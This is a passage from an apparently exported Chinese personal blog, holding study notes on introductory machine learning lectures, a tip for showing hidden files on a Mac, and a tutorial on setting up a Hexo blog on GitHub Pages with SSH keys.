<p><i class="fa fa-arrow-circle-right"></i> Loss means how good a set of values is.  当未知参数被设定时，评估输出的这笔数值好还是不好</p>
<p>对每一次的预测估计都有 $e = \mid y - \widehat{y} \mid$<br>最后计算得到结果 <strong>Loss</strong>  $L = \frac{1}{N} \sum_{i=1}^{n}{e_n} $</p>
<ul>
<li>$\widehat{y}$ : label, 真实的值（正确的数值）</li>
<li>$e_i$ : 每次估测的值与正确的值之间的差距（有不同的计算方法）</li>
<li>$N$ : 训练资料的总个数</li>
<li>$L$ : 每一笔训练资料的误差，L越大代表这组参数越不好，L越小代表现在这组参数越好</li>
</ul>
<p>采用哪种方法来衡量距离e根据个人需求和对任务的理解来进行选择，这里选择<code>MAE</code></p>
<p>$\bullet$  $e = \mid y - \widehat{y} \mid$    , L is mean absolute error(MAE)</p>
<p>$\bullet$  $e = (y - \widehat{y})^2$          , L is mean square error(MSE)</p>
<span class="label info">如果 $y$ 和 $\widehat{y}$ 都是几率分布的话可能会选择 `Cross- entropy`</span>

<p>尝试不同的参数来计算各参数对应Loss而画出一个图叫 <code>Error Surface</code> （可以是1D或2D，即一个或两个参数可变）</p>
<blockquote>
<ol start="3">
<li>Optimization</li>
</ol>
</blockquote>
<p>解决一个最佳化的问题，找到最佳的w和b使得loss最小 </p>
<p>$$w^*, b^* = arg\ min_{w,b}\ L $$</p>
<p><strong><u>Gradient Descent</u></strong>  <span class="label primary">（一个参数的情况）</span></p>
<p><i class="fa fa-chevron-right"></i> (Randomly) Pick an initial value $w^0$</p>
<p><i class="fa fa-chevron-right"></i> Compute $\frac{\partial{L}}{\partial{w}}\vert_{w=w^0}$ ,<br>计算在$w=w^0$的时候w这个参数对Loss的微分是多少，即在error surface这一个点的切线斜率</p>
<ul>
<li>Negative $\Rightarrow$ Increase w , 斜率为负数则增大w，就可以使loss的值变小</li>
<li>Positive $\Rightarrow$ Decrease w , 斜率为正数则减小w，可以让loss的值变小</li>
</ul>
<p>$$w^1 - w^0 = \eta * \frac{\partial{L}}{\partial{w}}|_{w=w^0}$$</p>
<p><i class="fa fa-chevron-right"></i> Update $w$ iteratively</p>
<ul>
<li>$\eta$ : learnign rate, 学习速率（自己设定，值大学习快），当微分值为0时就不再更新参数</li>
<li>hyperparameters: 机器学习中需要自己设定的参数    </li>
</ul>
<span class="label warning">这个方法可能存在local minima并不是我们想要的global minima的问题</span>

<p><strong><u>Gradient Descent</u></strong>  <span class="label primary">（两个参数的情况）</span></p>
<p><i class="fa fa-chevron-right"></i> (Randomly) Pick an initial value $w^0$, $b^0$</p>
<p><i class="fa fa-chevron-right"></i> Compute<br>$\eta \frac{\partial{L}}{\partial{w}} \vert_{w=w^0,b=b^0}$ ,<br>$\eta \frac{\partial{L}}{\partial{b}} \vert_{w=w^0,b=b^0}$ ,<br>计算在$w=w^0,\ b=b^0$的位置w这个参数对Loss的微分是多少以及在$w=w^0,\ b=b^0$的位置w这个参数对Loss的微分是多少</p>
<p><i class="fa fa-chevron-right"></i> Update $w$ and $b$ iteratively</p>
<p>$$w^1 =  w^0 - \eta \frac{\partial{L}}{\partial{w}}|_{w=w^0,b=b^0}$$</p>
<p>$$b^1 =  b^0 - \eta \frac{\partial{L}}{\partial{b}}|_{w=w^0,b=b^0}$$</p>
<div class="note info">
            <p>机器学习找函数式的以上三个步骤合起来称为 <em><strong><u>Training</u></strong></em> </p>
          </div>

<p>也就是说用旧的一些真实的数据训练的模型来预测之后可能的模型结果。</p>
<span class="label info">通常一个模型的修改往往来自于对这个模型的理解，也就是`Domain Knowledg`</span>

<p>观察我们随便乱写得到的真实模型发现每7天一个周期循环，所以写一个新模型 $y = b + \sum_{j=1}^7 w_jx_j$ ，发现sum求和数量依次增多后会达到一个饱和，误差率不再减小</p>
<div class="note info">
            <p>feature <code>x</code> * weight <code>w</code> + bias <code>b</code> 模型称作  <em><strong><u>Linear models</u></strong></em> </p>
          </div>

<p><img src="/2021/09/06/Machine-Learning-2021-Spring-Day1/1.LinearModels.png" alt="Linear Models"></p>
<h3 id="New-Model-More-Features"><a href="#New-Model-More-Features" class="headerlink" title="New Model : More Features"></a>New Model : More Features</h3><p>但是linear models过于简单且有一定的限制，这个东西叫做 <em><strong>Model Bias</strong></em> ，由此产生了一个更复杂且含有未知参数的function</p>
<p>All Piecewise Linear Curves = constant + sum of a set</p>
<blockquote>
<p>Sigmoid Function —— S型曲线</p>
</blockquote>
<p>曲折的直线函数可以看作一条曲线，而实际上sigmoid function 就是一个S型的曲线，它可以由一个函数式来表示</p>
<p><img src="/2021/09/06/Machine-Learning-2021-Spring-Day1/2.sigmoid.png" alt="Sigmoid Function"></p>
<p>$$<br>\begin{align}<br>y &amp; = c \ \frac{1}{1+e^{-(b+wx_1)}}  \<br>&amp; = c \ sigmoid \ (b+wx_1) \<br>\end{align}<br>$$</p>
<p>曲折的直线函数也可以由一个常量和一些线段的集合来表示</p>
<p><img src="/2021/09/06/Machine-Learning-2021-Spring-Day1/3.redcurve.png" alt="Sigmoid Function - sum of a set + constant"></p>
<p>$$<br>\begin{align}<br>y &amp; = b + \sum_j w_jx_j  \<br>y &amp; = b + \sum_i c_i \ sigmoid \ (b_i + \sum_j w_{i,j}x_j)  \<br>\end{align}<br>$$</p>
<p>其实函数式只有一些细微的差别，下面深入解析一下这个sigmoid function</p>
<p><img src="/2021/09/06/Machine-Learning-2021-Spring-Day1/4.sigmoid_1.png" alt="sigmoid 解析"></p>
<p><img src="/2021/09/06/Machine-Learning-2021-Spring-Day1/5.sigmoid_2.png" alt="sigmoid 解析"></p>
<p><img src="/2021/09/06/Machine-Learning-2021-Spring-Day1/6.sigmoid_3.png" alt="sigmoid 解析"></p>
<p><img src="/2021/09/06/Machine-Learning-2021-Spring-Day1/7.sigmoid_4.png" alt="sigmoid 解析"></p>
<p><img src="/2021/09/06/Machine-Learning-2021-Spring-Day1/8.sigmoid_5.png" alt="sigmoid 解析"></p>
<h3 id="Back-to-ML-Framework"><a href="#Back-to-ML-Framework" class="headerlink" title="Back to ML Framework"></a>Back to ML Framework</h3><blockquote>
<p>Step 1: function with unknown</p>
</blockquote>
<p><img src="/2021/09/06/Machine-Learning-2021-Spring-Day1/9.newmodel.png" alt="function with unknown"></p>
<blockquote>
<p>Step 2: define loss from traning data</p>
</blockquote>
<p><i class="fa fa-arrow-circle-right"></i> Loss is a function of parameters  $L(\theta)$</p>
<p><i class="fa fa-arrow-circle-right"></i> Loss means how good a set of values is. </p>
<p><img src="/2021/09/06/Machine-Learning-2021-Spring-Day1/10.newmodel_loss.png" alt="Loss"></p>
<p>得到结果 <strong>Loss</strong>  $L = \frac{1}{N} \sum_ne_n $</p>
<blockquote>
<p>Step 3: optimization</p>
</blockquote>
<p>$$<br>\begin{align}<br>\theta &amp;=<br>    \begin{bmatrix}<br>        \theta_1 \<br>        \theta_2 \<br>        \theta_3 \<br>         \vdots  \<br>    \end{bmatrix}<br>\end{align}<br>$$</p>
<p>$$\theta^* = arg\ min_\theta\ L $$</p>
<p><i class="fa fa-chevron-right"></i> (Randomly) Pick an initial value $\theta^0$</p>
<p><i class="fa fa-chevron-right"></i> Compute $ g =  \nabla L (\theta^0) $</p>
<p>$$<br>g_{gradient} = \begin{bmatrix}<br>                \frac{\partial L} {\partial \theta_1} |<em>{\theta = \theta^0} \<br>                \frac{\partial L} {\partial \theta_2} |</em>{\theta = \theta^0} \<br>                \vdots<br>               \end{bmatrix} \</p>
<p>$$</p>
<p>计算所有参数 $\theta^1、\theta^2、\theta^3$ 在 $\theta^0$ 的位置对 $L$ 的微分作为Gradient 向量。</p>
<p>$$<br>\begin{bmatrix}<br>    \theta_1^1 \<br>    \theta_2^1 \<br>      \vdots   \<br>\end{bmatrix}<br> =<br>\begin{bmatrix}<br>    \theta_1^0 \<br>    \theta_2^0 \<br>      \vdots   \<br>\end{bmatrix}<br> -<br>\begin{bmatrix}<br>    \eta  \frac{\partial{L}}{\partial{\theta_1}}|<em>{\theta=\theta^0} \<br>    \eta  \frac{\partial{L}}{\partial{\theta_2}}|</em>{\theta=\theta^0} \<br>      \vdots   \<br>\end{bmatrix}<br>$$</p>
<p><strong>Update</strong>  $ \theta^1 \leftarrow \theta^0 - \eta g $</p>
<p><i class="fa fa-chevron-right"></i> Compute $ g =  \nabla L (\theta^1) $</p>
<p><strong>Update</strong> $ \theta^2 \leftarrow \theta^1 - \eta g $</p>
<p><i class="fa fa-chevron-right"></i> Compute $ g =  \nabla L (\theta^2) $</p>
<p><strong>Update</strong> $ \theta^3 \leftarrow \theta^2 - \eta g $</p>
<p>以此类推，通常做到不想做之后停下来</p>
<p><img src="/2021/09/06/Machine-Learning-2021-Spring-Day1/11.optimization_of_newmodel.png" alt="optimization"></p>
<p><img src="/2021/09/06/Machine-Learning-2021-Spring-Day1/12.Example.png" alt="Example"></p>
<h3 id="Deep-Learning"><a href="#Deep-Learning" class="headerlink" title="Deep Learning"></a>Deep Learning</h3><blockquote>
<p>Sigmoid ➡️ ReLU （Rectified Linear Unit ）</p>
</blockquote>
<p>除了sigmoid ，也可以使用<code>ReLU</code>函数</p>
<p><img src="/2021/09/06/Machine-Learning-2021-Spring-Day1/13.ReLU.png" alt="Sigmoid-ReLU"></p>
<p>$$<br>y  = b + \sum_{2i} c_i \ max \ (0, b_i + \sum_j w_{i,j}x_j)<br>$$</p>
<blockquote>
<p> Activation function</p>
</blockquote>
<p>我们称 sigmoid 和 max 为 <code>Activation function</code></p>
<p><img src="/2021/09/06/Machine-Learning-2021-Spring-Day1/14.ActivationFunction.png" alt="Activation function"></p>
<blockquote>
<p>Hyperparameters</p>
</blockquote>
<p>这些生成的可控的参数就称之为<code>Hyperparameters</code></p>
<p><img src="/2021/09/06/Machine-Learning-2021-Spring-Day1/15.Hyperparameters.png" alt="Hyperparameters"></p>
<blockquote>
<p>Neutral Network</p>
</blockquote>
<p>我们将激活函数称为Neuron神经元，复合而成就生称了<code>Neutral Network</code>神经网络</p>
<p><img src="/2021/09/06/Machine-Learning-2021-Spring-Day1/16.NeutralNetwork.png" alt="Neutral Network"></p>
<blockquote>
<p>Deep Learning</p>
</blockquote>
<p>每一层神经元就称为hidden layer隐藏层，由很多层组成的神经网络我们叫它<code>Deep Learning</code>深度学习</p>
<p><img src="/2021/09/06/Machine-Learning-2021-Spring-Day1/17.DeepLearning.png" alt="Deep Learning"></p>
<blockquote>
<p>Overfitting</p>
</blockquote>
<p>但有时候使用更多的层数并没有更好的效率，训练集准确率高了但实际预测数据集准确率很低，这是因为达到了<code>Overfitting</code>过拟合。</p>
<p><img src="/2021/09/06/Machine-Learning-2021-Spring-Day1/18.Overfitting.png" alt="Overfitting"></p>
<h3 id="To-Learn-More-Three-Steps-for-Deep-Learning"><a href="#To-Learn-More-Three-Steps-for-Deep-Learning" class="headerlink" title="To Learn More - Three Steps for Deep Learning"></a>To Learn More - Three Steps for Deep Learning</h3><blockquote>
<p>Step 1: define a set of function</p>
</blockquote>
<p>这个function其实就是Neural Network，然后将这些Neural Network用不同的方式连接起来，比如<code>Fully Connect Feedforward Network</code>，就是将前一层和后一层的每个神经元都互相连接起来。</p>
<p><img src="/2021/09/06/Machine-Learning-2021-Spring-Day1/19.FullyConnectFeedforwardNetwork_example1.png" alt="Example 1 - Fully Connect Feedforward Network"></p>
<p>对于每条线和每个点，我们给它们添加上weight和bias的值，然后带入公式 $y=b+wx$ 计算，再通过sigmoid function的结果就是输出。</p>
<p><img src="/2021/09/06/Machine-Learning-2021-Spring-Day1/20.FullyConnectFeedforwardNetwork_example2.png" alt="Example 1 - Fully Connect Feedforward Network"></p>
<p>通常来讲，我们会有很多排neuron，每一排neuron里面可能会有很多个neuron，在layer和layer之间的neuron，是两两互相连接的，layer1的neuron的output就是所有layer2的neuron<br>的input，layer2的neuron的nput就是所有layer1的output。整个Network需要一个input，这个input就是一个vector， 对layer1的每一个neuron来说，它的input就是input layer的每一个dimension。最后假设第L排有M个neuron的话，这M个layer L的输出就是最后的output，组成一个vector。</p>
<p><img src="/2021/09/06/Machine-Learning-2021-Spring-Day1/21.FullyConnectFeedforwardNetwork.png" alt="Fully Connect Feedforward Network"></p>
<div class="note info">
            <p>Deep = Many hidden layers</p>
          </div>

<p>Network的运作我们常常会用<code>Matrix Operation</code>来表示</p>
<p><img src="/2021/09/06/Machine-Learning-2021-Spring-Day1/22.MatrixOperation_1.png" alt="Matrix Operation"></p>
<p>对于一整个neural network，我们也可以使用<code>Matrix Operation</code>这样表示</p>
<p><img src="/2021/09/06/Machine-Learning-2021-Spring-Day1/23.MatrixOperation_2.png" alt="Matrix Operation"></p>
<p>比如手写数字识别，对于一个neural network我们也可以将最后一层output当作一个<code>multiclass classifier</code>，然后对其添加softMax，最后输出就是每一个数字的概率。</p>
<blockquote>
<p>Step 2: goodness of function</p>
</blockquote>
<p>假设给定了一组参数，要做手写数字辨识，我有一张image跟它的label，于是现在的target就是一个10维的vector，只有在第一纬对应到数字1的地方它的值为1，其他都是0。将image的pixel输入，得到一组输出y，然后计算 $y$ 跟 $\widehat y$ 之间的 <code>cross entropy</code> ，接下来就是要调整network的参数使得这个 cross entropy 的值越小越好。</p>
<p><img src="/2021/09/06/Machine-Learning-2021-Spring-Day1/24.CrossEntropy.png" alt="Cross Entropy"></p>
<p>而实际上我们会对一大堆data进行training，将每个数据的cross entropy加起来得到一个<code>total loss L</code>，就是如何 minimize 这个 loss L的问题了。</p>
<p><img src="/2021/09/06/Machine-Learning-2021-Spring-Day1/25.TotalLoss.png" alt="Total Loss"></p>
<blockquote>
<p>Step 3: pick the best function</p>
</blockquote>
<p>采用 <code>Gradient Descent</code> 方法找到最优，像之前一样计算微分得到gradient向量，然后更新参数，不断反复进行这个process。</p>
<p><img src="/2021/09/06/Machine-Learning-2021-Spring-Day1/26.GradientDescent.png" alt="Gradient Descent - pick the best function"></p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>MachineLearning</tag>
      </tags>
  </entry>
  <entry>
    <title>Machine Learning 2021 Spring - Day2</title>
    <url>/2022/07/04/Machine-Learning-2021-Spring-Day2/</url>
    <content><![CDATA[<h2 id="Framework-of-ML"><a href="#Framework-of-ML" class="headerlink" title="Framework of ML"></a>Framework of ML</h2><p>通过三个步骤对训练数据集进行训练，然后带入模型对测试数据集进行训练，最终得到结果。</p>
<p><img src="/2022/07/04/Machine-Learning-2021-Spring-Day2/1.FrameworkofML.png" alt="Framework of ML"></p>
<p>就比如以下四个例子，对输入数据 $x$ 进行识别，得到真实标签 $ \widehat y $ 的值：</p>
<p><img src="/2022/07/04/Machine-Learning-2021-Spring-Day2/2.DataRecognition.png" alt="Data Recognition"></p>
<h2 id="General-Guide"><a href="#General-Guide" class="headerlink" title="General Guide"></a>General Guide</h2><p>按照下图的流程依次检查 training data 的 loss，然后根据实际来判别属于哪种情况：</p>
<p><img src="/2022/07/04/Machine-Learning-2021-Spring-Day2/3.GeneralGuide.png" alt="General Guide"></p>
<p>如果发现你的 training data 的 loss 很大，显然它在训练资料上面也没有学好，然后接下来分析是什么原因造成了在训练资料上没有学好呢？这边有两个可能：</p>
<h3 id="model-bias"><a href="#model-bias" class="headerlink" title="model bias"></a>model bias</h3><p>就好比在一个根本没有针的大海里捞针。</p>
<ul>
<li><p>由 model 过于简单而造成</p>
</li>
<li><p>解决方案：重新定义 model 使其更加灵活</p>
</li>
</ul>
<p><img src="/2022/07/04/Machine-Learning-2021-Spring-Day2/4.Solution.png" alt="Solution"></p>
<h3 id="optimization"><a href="#optimization" class="headerlink" title="optimization"></a>optimization</h3><p>这就好像是在大海捞针，但你不能找到它。</p>
<ul>
<li>巨大的损失也并不只是 model bias 造成的，也有别的可能，比如 optimization</li>
</ul>
<h3 id="Model-Bias-v-s-Optimization-Issue"><a href="#Model-Bias-v-s-Optimization-Issue" class="headerlink" title="Model Bias v.s. Optimization Issue"></a>Model Bias v.s. Optimization Issue</h3><ul>
<li>Ganing the insights from comparison</li>
</ul>
<p><img src="/2022/07/04/Machine-Learning-2021-Spring-Day2/5.OptimizationIssue.png" alt="Optimization Issue"></p>
<ul>
<li>Start from shallower networks(or other models), which are easier to optimize.</li>
<li>If deeper networks do not obtain smaller loss on <strong>traning data</strong> ,then there is optimization issue.</li>
<li>Solution: More powerful optimization technology(next lecture)…</li>
</ul>
<h3 id="Overfitting"><a href="#Overfitting" class="headerlink" title="Overfitting"></a>Overfitting</h3><ul>
<li>训练集数据的损失小，而测试集数据的损失大 </li>
</ul>
<p>举一个特殊的极端例子，function 的 $x$ 当作输入的时候，比对其有没有出现在训练资料里面，如果有，就直接把他对应的 $\widehat y$ 当作输出，；如果没有，则输出一个随机的值。 这个例子的训练资料的损失就是0，而测试集数据的损失却很大。</p>
<p>如果 model 自由度很大的话，会造成训练资料上的结果好，但是测试资料上的 loss 很大。</p>
<ul>
<li>解决方法：增加训练资料 ；给模型一些限制<ul>
<li>Less parameters(or deeplearning,less neurons), sharing parameters</li>
<li>Less features</li>
<li>Early stopping</li>
<li>Regularization</li>
<li>Dropout (deeplearning)</li>
</ul>
</li>
</ul>
<p>但是对于更多特征或更多参数的复杂的 model，会造成越复杂training loss越小，但testing loss经过最低值后会变大的情况，这时选择中间合适的点来作为model。</p>
<p><img src="/2022/07/04/Machine-Learning-2021-Spring-Day2/6.Bias-ConplexityTradeOff.png" alt="Bias-ComplexityTradeOff"> </p>
<p>也可以对 training set 进行一个划分，划成 training 和 validation 数据集，然后计算损失误差值，取平均值再选择最好的一个用于 testing set 的训练。</p>
<p><img src="/2022/07/04/Machine-Learning-2021-Spring-Day2/7.N-foldCrossValidation.png" alt="N-foldCrossValidation"></p>
<h3 id="Mismatch"><a href="#Mismatch" class="headerlink" title="Mismatch"></a>Mismatch</h3><ul>
<li>另一种错误的形式：模型认为根据以往数据应该是最低点，但实际不是而形成的不匹配</li>
<li>训练资料和测试资料分布不同</li>
</ul>
<p><img src="/2022/07/04/Machine-Learning-2021-Spring-Day2/8.Mismatch.png" alt="Mismatch"></p>
<h2 id="类神经网络训练不起来怎么办？"><a href="#类神经网络训练不起来怎么办？" class="headerlink" title="类神经网络训练不起来怎么办？"></a>类神经网络训练不起来怎么办？</h2><p>当参数对 loss 的微分为0的时候，gradient descent 就没有办法再 update 参数了，这时 training 就停下来了。</p>
<ul>
<li>local minima (局部最小值): gradient is close to zero，没有解决办法</li>
<li>saddle point (鞍点): gradient is close to zero，可以找到方法使 loss 更低</li>
<li>critical point: gradient 为0的点的统称</li>
</ul>
<p><img src="/2022/07/04/Machine-Learning-2021-Spring-Day2/9.CriticalPoint.png" alt="Critical Point"></p>
<h3 id="Local-Minima-v-s-Saddle-Point"><a href="#Local-Minima-v-s-Saddle-Point" class="headerlink" title="Local Minima v.s. Saddle Point"></a>Local Minima v.s. Saddle Point</h3><p>我们可以通过 minimum ratio 的比例大小来判断具体是局部最小值还是鞍点：</p>
<ul>
<li>如果所有 eigen value 都是正的，代表这个 critical point 是 local minima</li>
<li>如果 eigen value 有正有负，代表是 saddle point</li>
</ul>
<p>ps:但我们实际上会发现几乎找不到完全所有 eigen value 都是正的 critical point</p>
<p><img src="/2022/07/04/Machine-Learning-2021-Spring-Day2/10.EmpiricalStudy.png" alt="Empirical Study"></p>
<p>经验来讲，local minima 并不那么常见，多数时候训练到一定时候发现 gradient 很小了，参数也不 update 往往是因为卡在了 saddle point 。</p>
<h3 id="Batch-v-s-Momentum"><a href="#Batch-v-s-Momentum" class="headerlink" title="Batch v.s. Momentum"></a>Batch v.s. Momentum</h3><blockquote>
<p>Batch</p>
</blockquote>
<p>先来回顾一下 Optimization with Batch:<br>    每一个 Batch 的大小就是一个大B（一大笔资料），每次 update 参数时，就是拿大B出来计算 loss 和 gradient 。</p>
<p><img src="/2022/07/04/Machine-Learning-2021-Spring-Day2/11.OptimizationWithBatch.png" alt="Review: Optimization with Batch"></p>
<ul>
<li>所有的 Batch 看过一遍，叫做一个 Epoch</li>
<li>在每一个 Epoch 开始之前，会分一次 Batch ，而且每一次 Epoch 的 Batch 都不一样（重新划分），哪些资料在同一个 Batch 里面每一个 Epoch 都不一样这件事情，叫做 Shuffle </li>
</ul>
<span class="label info"> Tips：将Shuffle理解为洗牌，Epoch理解为发牌</span>

<p>这里举两个极端的例子来看看我们为什么要使用 Batch 以及 Batch 对 training 带来了什么样的帮助</p>
<p><img src="/2022/07/04/Machine-Learning-2021-Spring-Day2/12.SmallBatchVSLargeBatch.png" alt="Small Batch v.s. Large Batch"></p>
<p>上图中可以看到，左边是不使用 Batch 即 Full batch 的情况，右边是 Batch size 为1的情况，可以得到结果：左边的蓄力很长时间但效果很好，右边的每次时间很短但可能不太准确。<span class="label info"> Tips：对比大招和一技能的区别</span></p>
<hr>
<p>就结束蛮突然的… 后续… …</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>MachineLearning</tag>
      </tags>
  </entry>
  <entry>
    <title>Mac查看隐藏文件</title>
    <url>/2022/08/11/Mac%E6%9F%A5%E7%9C%8B%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6/</url>
    <content><![CDATA[<h3 id="方式一：在终端运行命令显示隐藏文件"><a href="#方式一：在终端运行命令显示隐藏文件" class="headerlink" title="方式一：在终端运行命令显示隐藏文件"></a>方式一：在终端运行命令显示隐藏文件</h3><p>在电脑桌面点击左侧的图标，接着在启动台里面搜索终端，点击黑色的图标启动终端：</p>
<ul>
<li>Mac显示“隐藏文件”命令：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">defaults write com.apple.finder AppleShowAllFiles -bool true</span><br></pre></td></tr></table></figure></li>
<li>Mac隐藏“隐藏文件”命令：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">defaults write com.apple.finder AppleShowAllFiles -bool false</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="方式二：快捷键显示隐藏文件"><a href="#方式二：快捷键显示隐藏文件" class="headerlink" title="方式二：快捷键显示隐藏文件"></a>方式二：快捷键显示隐藏文件</h3><p>在 Finder 打开想要查看隐藏文件的文件夹:</p>
<ul>
<li>显示隐藏文件快捷键: <code>Command + Shift + .</code></li>
<li>恢复隐藏文件的话再次按: <code>Shift + Command + .</code> <span class="label [warning]">此方法适用于macOS Sierra或以上的系统</span></li>
</ul>
<h3 id="用第三方应用程序-Funter-显示隐藏文件"><a href="#用第三方应用程序-Funter-显示隐藏文件" class="headerlink" title="用第三方应用程序 Funter 显示隐藏文件"></a>用第三方应用程序 Funter 显示隐藏文件</h3><p>Funter 是 Mac 上的一款高级文件隐藏工具，支持在 Finder 中切换隐藏文件的可见性。<br>用 Funter 显示隐藏文件的操作过程很简单，启动 Funter，单击菜单栏中的显示隐藏文件，打开查找器，在那里你会看到你的隐藏文件们。</p>
]]></content>
      <categories>
        <category>配置</category>
      </categories>
      <tags>
        <tag>Mac</tag>
      </tags>
  </entry>
  <entry>
    <title>My First Blog</title>
    <url>/2021/07/31/My-First-Blog/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>使用github pages服务搭建博客的好处有：</p>
<ol>
<li>全是静态文件，访问速度快；</li>
<li>免费方便，不用花一分钱就可以搭建一个自由的个人博客，不需要服务器不需要后台；</li>
<li>可以随意绑定自己的域名，不仔细看的话根本看不出来你的网站是基于github的；</li>
<li>数据绝对安全，基于github的版本管理，想恢复到哪个历史版本都行；</li>
<li>博客内容可以轻松打包、转移、发布到其它平台；</li>
</ol>
<p><img src="https://github.com/xinkjung/Photos/raw/master/xhr.jpg" alt="xhr"></p>
<span id="more"></span>


<h1 id="My-First-Blog–搭建过程"><a href="#My-First-Blog–搭建过程" class="headerlink" title="My First Blog–搭建过程"></a>My First Blog–搭建过程</h1><blockquote>
<p>准备</p>
</blockquote>
<ul>
<li>Node.js ： <a href="https://nodejs.org/en/%22%E5%AE%98%E7%BD%91%22">官网</a> 下载最新版本，默认安装即可</li>
<li>Git ：可通过 <a href="https://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000/00137396287703354d8c6c01c904c7d9ff056ae23da865a000">Git安装教程</a> 对于不同系统进行操作，也是默认安装即可</li>
<li>Hexo ： <a href="https://hexo.io/zh-cn/docs/index.html">Hexo官网</a> ，有详细配置操作</li>
<li>Github ： 没有就注册一个账号</li>
</ul>
<blockquote>
<p>本地设置初始化</p>
</blockquote>
<p>在你新建立文件夹下（如Blog），右键任意位置，选择 Git Bash Here，出现如下界面<br><img src="https://github.com/xinkjung/Photos/raw/master/GitBashHere.jpg" alt="GBH"></p>
<p>此时进行初始化操作，首先执行“hexo init”命令   </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ hexo init</span><br></pre></td></tr></table></figure>

<p> 并执行如下命令，安装 npm</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ npm install -g hexo</span><br></pre></td></tr></table></figure>

<p>然后进行生成预览及上传一系列操作：</p>
<pre><code>$ hexo g # == hexo generate 生成
$ hexo s # == hexo server 本地预览
$ hexo d # == hexo deploy 上传 
</code></pre>
<p>在浏览器中打开网址 <a href="https://localhost:4000/">https://localhost:4000</a> ，显示如下画面，就OK啦！（它已经自动写好了一篇Hello World的文章）<br><img src="https://github.com/xinkjung/Photos/raw/master/Hexo.jpg" alt="Hexo"></p>
<blockquote>
<p>绑定Github</p>
</blockquote>
<p>   首先创建一个名为 ‘你的用户名.github.io’的仓库，以后你的博客访问地址就是 https://你的用户名.github.io</p>
<p>然后可以绑定域名，我没进行这个操作就省略了哈。</p>
<p>下面就要配置SSH Key了<br>同上，一样的在你的根目录（我的是Blog）下使用Git Bash执行命令 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cd ~/. ssh #这个命令用于检测本机已存在的SSH key</span><br></pre></td></tr></table></figure>

<p>若提示：No such file or directory 说明你是第一次使用git。</p>
<p>然后再输入命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ssh-keygen -t rsa -C &quot;你的邮件地址&quot;</span><br></pre></td></tr></table></figure>

<p>连续三次回车，会生成一个名为 ‘.ssh\id_rsa.pub’ 的文件在你的用户目录下。找到此文件，记事本打开并复制里面内容，再进入你的Github主页，找到个人设置下的SSH and GPG keys -&gt; New SSH key， 把刚才复制的内容粘贴到key那里，title随便填，保存。<br>（这时你应该会收到一个邮件）</p>
<p>但是还不确定是否配置成功对吧，那我们现在来测试一下</p>
<p>同样的，在Git Bash 中输入命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ssh -T git@github.com  ##注意此处不用更改邮箱地址</span><br></pre></td></tr></table></figure>

<p>如果提示Are you sure you want to continue connecting (yes/no)?，输入yes，然后会出现如下字符</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hi 你的用户名! You’ve successfully authenticated, but GitHub does not provide shell access.</span><br></pre></td></tr></table></figure>

<p>就表示你的SSH key已经配置成功啦！！！</p>
<p>然后还要配置文件_config.yml中的deploy部分，用记事本打开该文件（Blog根目录下），修改如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repository: git@github.com:你的用户名/你的用户名.github.io.git</span><br><span class="line">  branch: hexo          # 这里建议不要存放于主分支master下，这是我的子分支hexo</span><br></pre></td></tr></table></figure>

<p>保存退出，再在Git Bash下执行命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>

<p>这时，再输入 hexo d，就会将本次有改动的代码全部提交，没有改动的不会。<br>命令执行成功后，浏览器中打开网址 https://你的用户名.github.io 就会看到和刚才打开 <a href="https://localhost:4000/">https://localhost:4000</a> 一样的页面，博客就搭建好啦！！！</p>
<blockquote>
<p>注意保留CNAME、README.md等文件</p>
</blockquote>
<p>提交之后网页可能打不开，这是因为代码仓库中少了一个名为CNAME的文件，手动添加一个文件再刷新几次就能打开了。（必须为命名为 ‘CNAME’，内容为你的网站域名,如：xinkjung.github.io）</p>
<p>为了避免此类现象，一些非md文件可以把它们放到根目录的source文件夹下，这里的所有文件都会原样复制（除了md文件）到public目录的，由于hexo默认会把所有md文件都转换成html，包括README.md，所有需要每次生成之后、上传之前，手动将README.md复制到public目录，并删除README.html。</p>
<p>其他参考<br><a href="http://www.cnblogs.com/MuYunyun/p/5927491.html">http://www.cnblogs.com/MuYunyun/p/5927491.html</a><br><a href="http://blog.haoji.me/build-blog-website-by-hexo-github.html?from=xa">http://blog.haoji.me/build-blog-website-by-hexo-github.html?from=xa</a></p>
<blockquote>
<p>插入图片</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">代码格式如下：  ![图片说明](./img/图片名.jpg...url)</span><br></pre></td></tr></table></figure>

<p> 图片保存于source文件夹的img目录内，不过这个好像无法显示图片</p>
<p> 推荐最好上传到仓库里，直接使用网页链接：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">github 图片链接格式：(http://github.com/yourname/your-repository/raw/master/images-folder/xxx.png)</span><br><span class="line">要自己设定的：yourname, your-repository, your-folder, xxx.png。    </span><br><span class="line">yourname            --- 你的帐号    </span><br><span class="line">your-respository    --- 你的 project 名    </span><br><span class="line">images-folder       --- 你存放图片的文件夹，如果是直接放在 project 的项目根目录的話，就可以省略這個    </span><br><span class="line">xxx.png             --- 你的图片名</span><br></pre></td></tr></table></figure>

<p>然后在**.md文件里添加，例如：我的存在于项目Photos根目录下<br><img src="https://github.com/xinkjung/Photos/raw/master/IMG_0019.JPG" alt="hhh"></p>
